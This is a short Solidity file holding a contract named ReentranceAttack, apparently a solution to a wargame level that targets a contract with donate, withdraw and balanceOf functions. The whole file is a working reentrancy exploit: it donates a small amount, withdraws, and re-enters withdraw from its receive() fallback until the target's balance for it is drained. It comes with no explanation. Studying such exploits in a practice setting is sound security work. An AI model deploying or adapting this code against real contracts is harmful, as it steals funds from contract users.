// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function withdraw(uint256 _amount) external ;
    function donate(address _to) external  payable;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentranceAttack {

    IReentrance reentrance;
    
    constructor(address _reentrance) public payable {
       reentrance = IReentrance(_reentrance);
    }

    function attack() public {
      (bool success,) = address(reentrance).call{value: 0.001 ether}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
      require(success, "attack failed");
      reentrance.withdraw(0.001 ether);
    }

    receive() payable external  {
      if (reentrance.balanceOf(address(this)) > 0) {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
      } 
      
    }
}